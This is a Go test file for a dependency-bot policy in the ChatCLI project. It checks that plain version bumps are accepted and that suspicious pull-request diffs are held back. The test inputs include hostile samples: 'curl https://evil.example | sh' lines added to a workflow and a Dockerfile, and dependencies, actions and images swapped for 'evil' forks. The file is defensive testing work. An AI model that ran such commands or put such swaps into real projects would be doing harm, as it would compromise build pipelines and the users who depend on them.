/*
 * ChatCLI - Command Line Interface for LLM interaction
 * Copyright (c) 2024 Edilson Freitas
 * License: Apache-2.0
 */
package depbot

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// fileDiff builds a one-hunk unified diff for path. Lines are given with
// their marker: " " context, "-" removed, "+" added.
func fileDiff(path string, lines ...string) string {
	return "diff --git a/" + path + " b/" + path + "\n" +
		"index 1111111..2222222 100644\n" +
		"--- a/" + path + "\n" +
		"+++ b/" + path + "\n" +
		"@@ -1,9 +1,9 @@\n" +
		strings.Join(lines, "\n") + "\n"
}

const (
	shaA = "3d3c42e5aac5ba805825da76410c181273ba90b1"
	shaB = "b7ad1dad31e06c5925ef5d2fc7ad053ef454303e"
)

func TestEvaluateDiffAcceptsPlainBumps(t *testing.T) {
	cases := map[string]string{
		"direct go module, minor": fileDiff("go.mod",
			" require (",
			"-\tgithub.com/andybalholm/brotli v1.2.8",
			"+\tgithub.com/andybalholm/brotli v1.3.0",
			" )"),
		"direct go module on a 0.x line": fileDiff("operator/go.mod",
			"-\tsigs.k8s.io/controller-runtime v0.25.2",
			"+\tsigs.k8s.io/controller-runtime v0.25.3"),
		"indirect modules may appear, vanish and use pseudo-versions": fileDiff("go.mod",
			"-\tgolang.org/x/exp v0.0.0-20260101000000-aaaaaaaaaaaa // indirect",
			"+\tgolang.org/x/exp v0.0.0-20260601000000-bbbbbbbbbbbb // indirect",
			"-\texample.com/gone v1.0.0 // indirect",
			"+\texample.com/arrived v2.0.0-rc.1 // indirect"),
		"tidy opening a second require block": fileDiff("go.mod",
			"+",
			"+require (",
			"+\texample.com/arrived v1.0.0 // indirect",
			"+)"),
		"single-line require": fileDiff("operator/go.mod",
			"-require github.com/google/uuid v1.6.0",
			"+require github.com/google/uuid v1.6.1"),
		"go.sum alone": fileDiff("operator/go.sum",
			"-example.com/x v1.0.0 h1:aaa=",
			"+example.com/x v1.0.1 h1:bbb="),
		"action pinned by commit": fileDiff(".github/workflows/1-ci.yml",
			"-      - uses: actions/setup-go@"+shaA+" # v7.0.0",
			"+      - uses: actions/setup-go@"+shaB+" # v7.1.0"),
		"action in a composite action, short version comment": fileDiff(".github/actions/setup-qg-tools/action.yml",
			"-        uses: imjasonh/setup-crane@"+shaA+" # v0.7",
			"+        uses: imjasonh/setup-crane@"+shaB+" # v0.7.1"),
		"two actions in one hunk": fileDiff(".github/workflows/security-scan.yml",
			"-        uses: actions/setup-go@"+shaA+" # v7.0.0",
			"+        uses: actions/setup-go@"+shaB+" # v7.1.0",
			"         with:",
			"-        uses: oras-project/setup-oras@"+shaA+" # v2.0.3",
			"+        uses: oras-project/setup-oras@"+shaB+" # v2.0.4"),
		"base image patch with variant suffix": fileDiff("Dockerfile",
			"-FROM golang:1.27.4-alpine AS builder",
			"+FROM golang:1.27.5-alpine AS builder"),
		"base image in a subdirectory": fileDiff("operator/Dockerfile",
			"-FROM golang:1.27.4 AS builder",
			"+FROM golang:1.28.0 AS builder"),
	}
	for name, diff := range cases {
		t.Run(name, func(t *testing.T) {
			p := EvaluateDiff(diff)
			assert.True(t, p.Eligible, "reasons: %v", p.Reasons)
		})
	}
}

func TestEvaluateDiffHoldsEverythingElse(t *testing.T) {
	cases := map[string]struct {
		diff   string
		reason string
	}{
		"empty diff": {"", "empty"},
		"new direct dependency": {fileDiff("go.mod",
			"+\tgithub.com/evil/new v1.0.0"), "new direct dependency"},
		"direct dependency removed": {fileDiff("go.mod",
			"-\tgithub.com/google/uuid v1.6.0"), "removed"},
		"direct major jump": {fileDiff("go.mod",
			"-\tgoogle.golang.org/grpc v0.99.0",
			"+\tgoogle.golang.org/grpc v1.0.0"), "major"},
		"direct pre-release": {fileDiff("go.mod",
			"-\tgoogle.golang.org/grpc v1.84.0",
			"+\tgoogle.golang.org/grpc v1.85.0-rc.1"), "pre-release"},
		"direct pseudo-version": {fileDiff("go.mod",
			"-\tgolang.org/x/crypto v0.58.0",
			"+\tgolang.org/x/crypto v0.58.1-0.20261009181718-2f1f834330b2"), "pseudo-version"},
		"direct downgrade": {fileDiff("go.mod",
			"-\tgolang.org/x/net v0.63.0",
			"+\tgolang.org/x/net v0.62.0"), "downgraded"},
		"indirect downgrade": {fileDiff("go.mod",
			"-\tgolang.org/x/net v0.63.0 // indirect",
			"+\tgolang.org/x/net v0.62.0 // indirect"), "downgraded"},
		"go directive": {fileDiff("go.mod",
			"-go 1.27.4",
			"+go 1.28.0"), "not a require entry"},
		"toolchain directive": {fileDiff("go.mod",
			"+toolchain go1.28.0"), "not a require entry"},
		"replace directive": {fileDiff("operator/go.mod",
			"-replace github.com/diillson/chatcli => ../",
			"+replace github.com/diillson/chatcli => github.com/evil/chatcli v1.0.0"), "not a require entry"},
		"replace entry inside a block": {fileDiff("go.mod",
			"+\tgolang.org/x/net => github.com/evil/net v0.63.0"), "not a require entry"},
		"exclude block opened": {fileDiff("go.mod",
			"+exclude (",
			"+\tgolang.org/x/net v0.63.0 // indirect",
			"+)"), "not a require entry"},
		"source file": {fileDiff("cli/cli.go",
			"+// innocent"), "not a dependency manifest"},
		"workflow outside the workflows directory": {fileDiff(".github/dependabot.yml",
			"+      interval: daily"), "not a dependency manifest"},
		"action major jump": {fileDiff(".github/workflows/1-ci.yml",
			"-      - uses: actions/setup-go@"+shaA+" # v7.0.0",
			"+      - uses: actions/setup-go@"+shaB+" # v8.0.0"), "major"},
		"action swapped for another": {fileDiff(".github/workflows/1-ci.yml",
			"-      - uses: actions/setup-go@"+shaA+" # v7.0.0",
			"+      - uses: evil/setup-go@"+shaB+" # v7.0.1"), "replaced by something else"},
		"action pinned by tag instead of commit": {fileDiff(".github/workflows/1-ci.yml",
			"-      - uses: actions/setup-go@"+shaA+" # v7.0.0",
			"+      - uses: actions/setup-go@v7.1.0"), "not a pinned version reference"},
		"workflow gains a step": {fileDiff(".github/workflows/1-ci.yml",
			"+      - run: curl https://evil.example | sh"), "added or removed"},
		"workflow line that is not a uses reference": {fileDiff(".github/workflows/1-ci.yml",
			"-        run: go test ./...",
			"+        run: curl https://evil.example | sh"), "not a pinned version reference"},
		"step list marker changed around a bump": {fileDiff(".github/workflows/1-ci.yml",
			"-      - uses: actions/setup-go@"+shaA+" # v7.0.0",
			"+        uses: actions/setup-go@"+shaB+" # v7.1.0"), "replaced by something else"},
		"go release candidate image": {fileDiff("Dockerfile",
			"-FROM golang:1.27.4-alpine AS builder",
			"+FROM golang:1.28rc2-alpine AS builder"), "not a pinned version reference"},
		"dotted release candidate image": {fileDiff("Dockerfile",
			"-FROM golang:1.27.4 AS builder",
			"+FROM golang:1.28.0-rc1 AS builder"), "not a pinned version reference"},
		"image variant changed": {fileDiff("Dockerfile",
			"-FROM golang:1.27.4-alpine AS builder",
			"+FROM golang:1.27.5-bookworm AS builder"), "replaced by something else"},
		"image swapped": {fileDiff("Dockerfile",
			"-FROM golang:1.27.4 AS builder",
			"+FROM evil/golang:1.27.5 AS builder"), "replaced by something else"},
		"unversioned image tag": {fileDiff("operator/Dockerfile",
			"-FROM gcr.io/distroless/static-debian13:nonroot",
			"+FROM gcr.io/distroless/static-debian14:nonroot"), "not a pinned version reference"},
		"image major jump": {fileDiff("Dockerfile",
			"-FROM alpine:3.24.3",
			"+FROM alpine:4.0.0"), "major"},
		"dockerfile instruction": {fileDiff("Dockerfile",
			"-RUN go build ./...",
			"+RUN curl https://evil.example | sh"), "not a pinned version reference"},
		"new file":     {"diff --git a/Dockerfile.extra b/Dockerfile.extra\nnew file mode 100644\n--- /dev/null\n+++ b/Dockerfile.extra\n@@ -0,0 +1 @@\n+FROM golang:1.27.4\n", "created"},
		"deleted file": {"diff --git a/go.sum b/go.sum\ndeleted file mode 100644\n--- a/go.sum\n+++ /dev/null\n@@ -1 +0,0 @@\n-x\n", "deleted"},
		"renamed file": {"diff --git a/go.sum b/operator/go.sum\nsimilarity index 100%\nrename from go.sum\nrename to operator/go.sum\n", "renamed"},
		"binary file":  {"diff --git a/go.sum b/go.sum\nindex 1..2 100644\nBinary files a/go.sum and b/go.sum differ\n", "binary"},
		"mode change":  {"diff --git a/go.sum b/go.sum\nold mode 100644\nnew mode 100755\n", "mode changed"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			p := EvaluateDiff(tc.diff)
			require.False(t, p.Eligible)
			assert.Contains(t, strings.Join(p.Reasons, "\n"), tc.reason)
		})
	}
}

// One bad file is enough, however many good ones surround it.
func TestEvaluateDiffHoldsMixedPullRequest(t *testing.T) {
	diff := fileDiff("go.mod",
		"-\tgithub.com/andybalholm/brotli v1.2.8",
		"+\tgithub.com/andybalholm/brotli v1.3.0") +
		fileDiff("go.sum", "+x") +
		fileDiff("scripts/qg/lib.sh", "+echo pwned")
	p := EvaluateDiff(diff)
	require.False(t, p.Eligible)
	assert.Equal(t, []string{"scripts/qg/lib.sh: not a dependency manifest"}, p.Reasons)
	assert.Len(t, p.Bumps, 1)
}

// A removed line whose content starts with "-- " renders as "--- ..." and
// an added "++ " one as "+++ ...": inside a hunk they are content, not
// file headers.
func TestParseDiffKeepsHeaderLookalikesInsideHunks(t *testing.T) {
	files := parseDiff(fileDiff("go.sum", "--- a/old", "+++ b/new"))
	require.Len(t, files, 1)
	assert.Equal(t, []string{"-- a/old"}, files[0].removed())
	assert.Equal(t, []string{"++ b/new"}, files[0].added())
	assert.Empty(t, files[0].shape)
}

func TestNeedsDepsLabelTracksRootGoModOnly(t *testing.T) {
	bump := func(path string) string {
		return fileDiff(path,
			"-\tgithub.com/google/uuid v1.6.0",
			"+\tgithub.com/google/uuid v1.6.1")
	}
	assert.True(t, EvaluateDiff(bump("go.mod")).NeedsDepsLabel)
	assert.False(t, EvaluateDiff(bump("operator/go.mod")).NeedsDepsLabel)
	assert.False(t, EvaluateDiff(fileDiff("go.sum", "+x")).NeedsDepsLabel)
}

func TestBumpsDescribeTheChange(t *testing.T) {
	p := EvaluateDiff(fileDiff("go.mod",
		"-\tgithub.com/google/uuid v1.6.0",
		"+\tgithub.com/google/uuid v1.6.1",
		"+\texample.com/arrived v1.0.0 // indirect"))
	assert.Equal(t, []Bump{
		{File: "go.mod", Kind: KindGoIndirect, Name: "example.com/arrived", To: "v1.0.0"},
		{File: "go.mod", Kind: KindGoDirect, Name: "github.com/google/uuid", From: "v1.6.0", To: "v1.6.1"},
	}, p.Bumps)
}

func TestVersionCompare(t *testing.T) {
	order := []string{
		"v0.0.0-20260101000000-aaaaaaaaaaaa",
		"v0.0.0-20260601000000-bbbbbbbbbbbb",
		"v0.7",
		"v0.7.1",
		"v1.0.0-rc.1",
		"v1.0.0",
		"v1.0.0+incompatible",
		"1.2.3",
		"v2",
	}
	for i := 1; i < len(order); i++ {
		a, ok := parseVersion(order[i-1])
		require.True(t, ok, order[i-1])
		b, ok := parseVersion(order[i])
		require.True(t, ok, order[i])
		assert.LessOrEqual(t, a.compare(b), 0, "%s vs %s", order[i-1], order[i])
		assert.GreaterOrEqual(t, b.compare(a), 0, "%s vs %s", order[i], order[i-1])
	}
	for _, bad := range []string{"", "latest", "nonroot", "1.28rc2", "v1.x"} {
		_, ok := parseVersion(bad)
		assert.False(t, ok, bad)
	}
}

// collectRequires cannot tell a require entry from an exclude or retract
// entry inside an existing block, because a diff does not carry the block
// header. The policy is sound only while neither go.mod has such a block;
// this pins that, so adding one fails here and forces the policy to learn
// about it first.
func TestRepositoryGoModsHaveNoExcludeOrRetract(t *testing.T) {
	directive := regexp.MustCompile(`(?m)^(exclude|retract)\b`)
	for _, rel := range []string{"go.mod", "operator/go.mod"} {
		data, err := os.ReadFile(filepath.Join("..", "..", "..", filepath.FromSlash(rel)))
		require.NoError(t, err)
		assert.False(t, directive.Match(data), "%s has an exclude or retract directive", rel)
	}
}
